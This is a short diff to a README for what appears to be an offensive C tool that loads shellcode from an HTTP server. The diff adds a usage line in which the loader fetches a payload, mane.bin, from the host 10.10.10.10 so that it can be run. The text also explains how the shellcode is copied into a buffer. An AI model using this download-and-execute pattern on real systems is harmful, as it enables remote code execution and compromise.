@@ -2,6 +2,8 @@
 
 Loading shell code from HTTP server, Using C Programming Language.
 
+Usage: `loaderFromHTTPWithC.exe <http://10.10.10.10/mane.bin>`
+
 ## Technical
 
 Send a HTTP Request, receive binary shellcode, bit by bit copy into buffer.
